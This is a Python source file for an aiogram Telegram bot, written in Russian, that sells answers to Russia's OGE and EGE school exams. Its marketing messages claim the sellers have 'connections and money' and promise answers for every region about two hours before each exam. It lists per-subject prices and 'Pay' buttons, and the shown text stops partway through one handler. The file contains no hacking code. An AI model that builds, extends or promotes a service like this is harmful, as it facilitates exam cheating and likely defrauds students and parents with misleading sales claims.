from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram import executor
import json
import os

bot = Bot(token='') #здесь должен быть токен вашего бота

dp = Dispatcher(bot, storage=MemoryStorage())

class FSMAdmin(StatesGroup):
    firstState = State()
    secondState = State()

@dp.message_handler(commands='start')
async def echo(message: types.Message):
    await message.answer('Привет!👋 Это бот ответов на ОГЭ и ЕГЭ📝!', parse_mode='HTML')   
    keyboardmain = types.InlineKeyboardMarkup(row_width=1)
    first_button = types.InlineKeyboardButton(text="🔵ОТВЕТЫ НА ОГЭ🔵", callback_data="first")
    second_button = types.InlineKeyboardButton(text="🟠ОТВЕТЫ НА ЕГЭ🟠", callback_data="second")
    keyboardmain.add(first_button, second_button)
    await message.answer('Почему стоит сотрудничать с нами?🤔' + '\n\n' + '1️⃣  Мы помним, как <b>САМИ</b> сдавали экзамены, помним как <b>тяжело</b> нам было готовиться.😰 Мы решили <b>помочь</b> ребятам, которые будут сдавать экзамены в этом году, не тратить лишние <b>нервы, время и деньги</b> на подготовку.'+'\n\n'+'2️⃣ Мы не учителя, мы не эксперты в области образования, но <b>связи и деньги</b> у нас есть💸😏, а значит мы можем помочь друг другу😎.  Мы заинтересованы в том, чтобы вы сдали экзамены и написали позитивный отзыв💯.'+'\n\n'+'3️⃣ Сотрудничая с нами, вы экономите в первую очередь <b>СВОЁ</b> время⏳. Мы уже нашли и купили места в <b>ПРОВЕРЕННЫХ ИСТОЧНИКАХ</b>👆, разделили их стоимость на части и отдаём вам почти даром🥵. Вы в плюсе и мы в плюсе. Как говорится : <b>"и волки сыты, и овцы целы"</b>😉'+'\n\n'+'4️⃣ <b>ВЫ САМИ ВЫБИРАЕТЕ ЧТО ПОКУПАТЬ</b>🧠!  У нас вы можете взять ответы на <b>ОДИН</b>⭐️ экзамен или взять <b>ВСЁ СРАЗУ</b>✨!'+'\n\n'+'5️⃣ Ответы придут за 2 часа до экзамена! Вы получите ответы <b>ПО ВСЕМ РЕГИОНАМ🫡!</b>', parse_mode='HTML', reply_markup= keyboardmain)

@dp.callback_query_handler(lambda call:True)
async def callback_inline(call):

    if call.data == "menu":
        keyboardmain = types.InlineKeyboardMarkup(row_width=1)
        first_button = types.InlineKeyboardButton(text="🔵ОТВЕТЫ НА ОГЭ🔵", callback_data="first")
        second_button = types.InlineKeyboardButton(text="🟠ОТВЕТЫ НА ЕГЭ🟠", callback_data="second")
        keyboardmain.add(first_button, second_button)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Почему стоит сотрудничать с нами?🤔' + '\n\n' + '1️⃣  Мы помним, как <b>САМИ</b> сдавали экзамены, помним как <b>тяжело</b> нам было готовиться.😰 Мы решили <b>помочь</b> ребятам, которые будут сдавать экзамены в этом году, не тратить лишние <b>нервы, время и деньги</b> на подготовку.'+'\n\n'+'2️⃣ Мы не учителя, мы не эксперты в области образования, но <b>связи и деньги</b> у нас есть💸😏, а значит мы можем помочь друг другу😎.  Мы заинтересованы в том, чтобы вы сдали экзамены и написали позитивный отзыв💯.'+'\n\n'+'3️⃣ Сотрудничая с нами, вы экономите в первую очередь <b>СВОЁ</b> время⏳. Мы уже нашли и купили места в <b>ПРОВЕРЕННЫХ ИСТОЧНИКАХ</b>👆, разделили их стоимость на части и отдаём вам почти даром🥵. Вы в плюсе и мы в плюсе. Как говорится : <b>"и волки сыты, и овцы целы"</b>😉'+'\n\n'+'4️⃣ <b>ВЫ САМИ ВЫБИРАЕТЕ ЧТО ПОКУПАТЬ</b>🧠!  У нас вы можете взять ответы на <b>ОДИН</b>⭐️ экзамен или взять <b>ВСЁ СРАЗУ</b>✨! '+'\n\n'+'5️⃣ Ответы придут за 2 часа до экзамена! Вы получите ответы <b>ПО ВСЕМ РЕГИОНАМ🫡!</b>', parse_mode='HTML', reply_markup= keyboardmain)

    if call.data == "first":
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        but13 = types.InlineKeyboardButton(text="🔹ФРАНЦУЗСКИЙ ЯЗЫК🔹", callback_data="13")
        but5 = types.InlineKeyboardButton(text="🔹АНГЛИЙСКИЙ ЯЗЫК🔹", callback_data="5")
        but4 = types.InlineKeyboardButton(text="🔹ОБЩЕСТВОЗНАНИЕ🔹", callback_data="4") 
        but12 = types.InlineKeyboardButton(text="🔹НЕМЕЦКИЙ ЯЗЫК🔹", callback_data="12")
        but1 = types.InlineKeyboardButton(text="🔹РУССКИЙ ЯЗЫК🔹", callback_data="1")
        but6 = types.InlineKeyboardButton(text="🔹ИНФОРМАТИКА🔹", callback_data="6")
        but2 = types.InlineKeyboardButton(text="🔹МАТЕМАТИКА🔹", callback_data="2")        
        but7 = types.InlineKeyboardButton(text="🔹ГЕОГРАФИЯ🔹", callback_data="7")
        but10 = types.InlineKeyboardButton(text="🔹БИОЛОГИЯ🔹", callback_data="10")
        but9 = types.InlineKeyboardButton(text="🔹ИСТОРИЯ🔹", callback_data="9")
        but8 = types.InlineKeyboardButton(text="🔹ФИЗИКА🔹", callback_data="8")     
        but11 = types.InlineKeyboardButton(text="🔹ХИМИЯ🔹", callback_data="11")
        butDiamondOge = types.InlineKeyboardButton(text="✅💎ВСЁ💎✅", callback_data="diamondOge")
        back_to_menu = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard.add(but13, but5, but4, but12, but6, but1, but2, but7, but10, but9, but8, but11 , butDiamondOge ,back_to_menu)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Почему стоит сотрудничать с нами?🤔' + '\n\n' + '1️⃣  Мы помним, как <b>САМИ</b> сдавали экзамены, помним как <b>тяжело</b> нам было готовиться.😰 Мы решили <b>помочь</b> ребятам, которые будут сдавать экзамены в этом, не тратить лишние <b>нервы, время и деньги</b> на подготовку.'+'\n\n'+'2️⃣ Мы не учителя, мы не эксперты в области образования, но <b>связи и деньги</b> у нас есть💸😏, а значит мы можем помочь друг другу😎.  Мы заинтересованы в том, чтобы вы сдали экзамены и написали позитивный отзыв💯.'+'\n\n'+'3️⃣ Сотрудничая с нами, вы экономите в первую очередь <b>СВОЁ</b> время⏳. Мы уже нашли и купили места в <b>ПРОВЕРЕННЫХ ИСТОЧНИКАХ</b>👆, разделили их стоимость на части и отдаём вам почти даром🥵. Вы в плюсе и мы в плюсе. Как говорится : <b>"и волки сыты, и овцы целы"</b>😉'+'\n\n'+'4️⃣ <b>ВЫ САМИ ВЫБИРАЕТЕ ЧТО ПОКУПАТЬ</b>🧠!  У нас вы можете взять ответы на <b>ОДИН</b>⭐️ экзамен или взять <b>ВСЁ СРАЗУ</b>✨?'+'\n\n'+'5️⃣ Ответы придут за 2 часа до экзамена! Вы получите ответы <b>ПО ВСЕМ РЕГИОНАМ🫡!</b>', parse_mode='HTML', reply_markup=keyboard)
         
    if call.data == "second":
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        but13ege = types.InlineKeyboardButton(text="🔸ФРАНЦУЗСКИЙ ЯЗЫК🔸", callback_data="13ege")
        but5ege = types.InlineKeyboardButton(text="🔸АНГЛИЙСКИЙ ЯЗЫК🔸", callback_data="5ege")
        but4ege = types.InlineKeyboardButton(text="🔸ОБЩЕСТВОЗНАНИЕ🔸", callback_data="4ege") 
        but12ege = types.InlineKeyboardButton(text="🔸НЕМЕЦКИЙ ЯЗЫК🔸", callback_data="12ege")
        but1ege = types.InlineKeyboardButton(text="🔸РУССКИЙ ЯЗЫК🔸", callback_data="1ege")
        but6ege = types.InlineKeyboardButton(text="🔸ИНФОРМАТИКА🔸", callback_data="6ege")
        but2ege = types.InlineKeyboardButton(text="🔸МАТЕМАТИКА🔸", callback_data="2ege")        
        but7ege = types.InlineKeyboardButton(text="🔸ГЕОГРАФИЯ🔸", callback_data="7ege")
        but10ege = types.InlineKeyboardButton(text="🔸БИОЛОГИЯ🔸", callback_data="10ege")
        but9ege = types.InlineKeyboardButton(text="🔸ИСТОРИЯ🔸", callback_data="9ege")
        but8ege = types.InlineKeyboardButton(text="🔸ФИЗИКА🔸", callback_data="8ege")     
        but11ege = types.InlineKeyboardButton(text="🔸ХИМИЯ🔸", callback_data="11ege")
        butDiamondege = types.InlineKeyboardButton(text="✅💎ВСЁ💎✅", callback_data="diamondEge")
        back_to_menu_second = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard.add(but13ege, but5ege, but4ege, but12ege, but6ege, but1ege, but2ege, but7ege, but10ege, but9ege, but8ege, but11ege, butDiamondege ,back_to_menu_second)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Почему стоит сотрудничать с нами?🤔' + '\n\n' + '1️⃣  Мы помним, как <b>САМИ</b> сдавали экзамены, помним как <b>тяжело</b> нам было готовиться.😰 Мы решили <b>помочь</b> ребятам, которые будут сдавать экзамены в этом, не тратить лишние <b>нервы, время и деньги</b> на подготовку.'+'\n\n'+'2️⃣ Мы не учителя, мы не эксперты в области образования, но <b>связи и деньги</b> у нас есть💸😏, а значит мы можем помочь друг другу😎.  Мы заинтересованы в том, чтобы вы сдали экзамены и написали позитивный отзыв💯.'+'\n\n'+'3️⃣ Сотрудничая с нами, вы экономите в первую очередь <b>СВОЁ</b> время⏳. Мы уже нашли и купили места в <b>ПРОВЕРЕННЫХ ИСТОЧНИКАХ</b>👆, разделили их стоимость на части и отдаём вам почти даром🥵. Вы в плюсе и мы в плюсе. Как говорится : <b>"и волки сыты, и овцы целы"</b>😉'+'\n\n'+'4️⃣ <b>ВЫ САМИ ВЫБИРАЕТЕ ЧТО ПОКУПАТЬ</b>🧠!  У нас вы можете взять ответы на <b>ОДИН</b>⭐️ экзамен или взять <b>ВСЁ СРАЗУ</b>✨?'+'\n\n'+'5️⃣ Ответы придут за 2 часа до экзамена! Вы получите ответы <b>ПО ВСЕМ РЕГИОНАМ🫡!</b>', parse_mode='HTML', reply_markup=keyboard)

    if call.data == "13":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹ФРАНЦУЗСКИЙ ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺<b>\n\n‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "5":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹АНГЛИЙСКИЙ ЯЗЫК ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺<b>\n\n‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "4":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹ОБЩЕСТВОЗНАНИЕ ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "12":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹НЕМЕЦКИЙ ЯЗЫК ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "1":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹РУССКИЙ ЯЗЫК ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "6":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹ИНФОРМАТИКА ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "2":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹МАТЕМАТИКА ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
    
    elif call.data == "7":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹ГЕОГРАФИЯ ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
    
    elif call.data == "10":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹БИОЛОГИЯ ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "9":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹ИСТОРИЯ ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "8":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹ФИЗИКА ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "11":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔹ХИМИЯ ОГЭ🔹\n\n<b>Стоимость:</b> 990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "diamondOge":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>✅💎ВСЁ (ОГЭ)💎✅\n\n<b>Стоимость:</b> 2490 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "diamondEge":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_ege_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_ege_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>✅💎ВСЁ (ЕГЭ)(ОБА УРОВНЯ МАТЕМАТИКИ)💎✅\n\n<b>Стоимость:</b> 6990 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

   


    if call.data == "13ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸ФРАНЦУЗСКИЙ ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
 
    elif call.data == "5ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸АНГЛИЙСКИЙ ЯЗЫК ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "4ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸ОБЩЕСТВОЗНАНИЕ ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "12ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸НЕМЕЦКИЙ ЯЗЫК ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "1ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸РУССКИЙ ЯЗЫК ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "6ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸ИНФОРМАТИКА ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)




    elif call.data == "2ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="💥БАЗОВЫЙ УРОВЕНЬ💥", callback_data="egechangelevelbase")
        but_oge_price2 = types.InlineKeyboardButton(text="🔥ПРОФИЛЬНЫЙ УРОВЕНЬ🔥", callback_data="egechangelevelprof")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price,but_oge_price2, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Почему стоит сотрудничать с нами?🤔' + '\n\n' + '1️⃣  Мы помним, как <b>САМИ</b> сдавали экзамены, помним как <b>тяжело</b> нам было готовиться.😰 Мы решили <b>помочь</b> ребятам, которые будут сдавать экзамены в этом, не тратить лишние <b>нервы, время и деньги</b> на подготовку.'+'\n\n'+'2️⃣ Мы не учителя, мы не эксперты в области образования, но <b>связи и деньги</b> у нас есть💸😏, а значит мы можем помочь друг другу😎.  Мы заинтересованы в том, чтобы вы сдали экзамены и написали позитивный отзыв💯.'+'\n\n'+'3️⃣ Сотрудничая с нами, вы экономите в первую очередь <b>СВОЁ</b> время⏳. Мы уже нашли и купили места в <b>ПРОВЕРЕННЫХ ИСТОЧНИКАХ</b>👆, разделили их стоимость на части и отдаём вам почти даром🥵. Вы в плюсе и мы в плюсе. Как говорится : <b>"и волки сыты, и овцы целы"</b>😉'+'\n\n'+'4️⃣ <b>ВЫ САМИ ВЫБИРАЕТЕ ЧТО ПОКУПАТЬ</b>🧠!  У нас вы можете взять ответы на <b>ОДИН</b>⭐️ экзамен или взять <b>ВСЁ СРАЗУ</b>✨?'+'\n\n'+'5️⃣ Ответы придут за 2 часа до экзамена! Вы получите ответы <b>ПО ВСЕМ РЕГИОНАМ🫡!</b>',parse_mode='HTML', reply_markup=keyboard_price)

    elif call.data == "egechangelevelbase":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸МАТЕМАТИКА ЕГЭ(БАЗОВЫЙ УРОВЕНЬ)🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
 
    elif call.data == "egechangelevelprof":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸МАТЕМАТИКА ЕГЭ(ПРОФИЛЬНЫЙ УРОВЕНЬ)🔸\n\n<b>Стоимость:</b> 3499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)




    elif call.data == "7ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
